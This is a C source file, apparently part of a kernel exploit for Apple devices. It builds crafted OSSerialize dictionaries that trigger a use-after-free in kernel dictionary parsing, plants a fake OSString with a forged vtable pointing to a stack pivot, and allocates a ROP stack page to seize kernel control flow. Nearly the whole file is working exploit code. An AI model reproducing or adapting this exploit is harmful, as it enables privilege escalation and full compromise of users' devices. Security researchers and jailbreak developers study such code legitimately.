#include <stdint.h>             // uint32_t
#include <unistd.h>             // usleep

#include <mach/kern_return.h>   // kern_return_t, KERN_SUCCESS
#include <mach/mach_error.h>    // mach_error_string
#include <mach/mach_init.h>
#include <mach/vm_map.h>

#include "common.h"             // DEBUG, PRINT_BUF, file_t
#include "io.h"                 // kOS*, OSString, dict_parse
#include "offsets.h"            // use_new_payload
#include "rop.h"                // get_stack_pivot
#include "slide.h"              // get_kernel_slide

#include "uaf_rop.h"

void uaf_parse(const OSString *fake)
{
    DEBUG("Using UAF to gain PC control...");

    const uint32_t *data = (const uint32_t*)fake;
    PRINT_BUF("Data", data, sizeof(OSString));

    const char str[] = "str",
               ref[] = "ref";

    if(use_new_payload())
    {
        uint32_t dict_92[] =
        {
            kOSSerializeMagic,                                          // Magic
            kOSSerializeEndCollection | kOSSerializeDictionary | 4,     // Dictionary with 4 entries

            kOSSerializeString | 4,                                     // String that will get freed
            *((uint32_t*)str),
            kOSSerializeData | sizeof(OSString),                        // OSData with same size as OSString
#ifdef __LP64__
            data[0],                                                    // vtable pointer (lower half)
            data[1],                                                    // vtable pointer (upper half)
            data[2],                                                    // retainCount
            data[3],                                                    // flags
            data[4],                                                    // length
            data[5],                                                    // (padding)
            data[6],                                                    // string pointer (lower half)
            data[7],                                                    // string pointer (upper half)
#else
            data[0],                                                    // vtable pointer
            data[1],                                                    // retainCount
            data[2],                                                    // flags
            data[3],                                                    // length
            data[4],                                                    // string pointer
#endif

            kOSSerializeSymbol | 4,                                     // Whatever name for our reference
            *((uint32_t*)ref),
            kOSSerializeEndCollection | kOSSerializeObject | 1,         // Reference to object 1 (OSString)
        };
        PRINT_BUF("dict_92", dict_92, sizeof(dict_92));
        dict_parse(dict_92, sizeof(dict_92));
    }
    else
    {
        uint32_t dict_90[] =
        {
            kOSSerializeMagic,                                          // Magic
            kOSSerializeEndCollection | kOSSerializeDictionary | 4,     // Dictionary with 4 entries

            kOSSerializeSymbol | 4,                                     // Just a name
            *((uint32_t*)str),
            kOSSerializeString | 4,                                     // String that will get freed
            *((uint32_t*)str),

            kOSSerializeObject | 1,                                     // Same name
            kOSSerializeBoolean | 1,                                    // Lightweight value

            kOSSerializeObject | 1,                                     // Same name again
            kOSSerializeData | sizeof(OSString),                        // OSData with same size as OSString
#ifdef __LP64__
            data[0],                                                    // vtable pointer (lower half)
            data[1],                                                    // vtable pointer (upper half)
            data[2],                                                    // retainCount
            data[3],                                                    // flags
            data[4],                                                    // length
            data[5],                                                    // (padding)
            data[6],                                                    // string pointer (lower half)
            data[7],                                                    // string pointer (upper half)
#else
            data[0],                                                    // vtable pointer
            data[1],                                                    // retainCount
            data[2],                                                    // flags
            data[3],                                                    // length
            data[4],                                                    // string pointer
#endif

            kOSSerializeSymbol | 4,                                     // Whatever name for our reference
            *((uint32_t*)ref),
            kOSSerializeEndCollection | kOSSerializeObject | 2,         // Reference to object 1 (OSString)
        };
        PRINT_BUF("dict_90", dict_90, sizeof(dict_90));
        dict_parse(dict_90, sizeof(dict_90));
    }
}

// Don't risk deallocating this once we acquire it
addr_t* uaf_rop_stack(void)
{
    static addr_t *ptr = NULL;
    if(ptr == NULL)
    {
        kern_return_t ret;
        vm_size_t page_size = 0;
        host_page_size(mach_host_self(), &page_size);
        DEBUG("Page size: " SIZE, (size_t)page_size);

        vm_address_t addr = kOSSerializeObject; // dark magic

        DEBUG("Allocating ROP stack page at " ADDR, (addr_t)addr);
        ret = vm_allocate(mach_task_self(), &addr, page_size, 0);
        if(ret != KERN_SUCCESS)
        {
            THROW("Failed to allocate page at " ADDR " (%s)", (addr_t)addr, mach_error_string(ret));
        }
        DEBUG("Allocated ROP page at " ADDR, (addr_t)addr);
        ptr = (addr_t*)addr;
    }
    return ptr;
}

void uaf_rop(void)
{
    DEBUG("Executing ROP chain...");
    usleep(10000); // In case we panic...

    addr_t vtab[] =
    {
        0x0,
        0x0,
        0x0,
        0x0,
        get_stack_pivot(),
    };
    OSString osstr =
    {
        .vtab = (vtab_t)vtab,
        .retainCount = 100,
        .flags = kOSStringNoCopy,
        .length = 0,
        .string = NULL,
    };

    uaf_parse(&osstr);
}
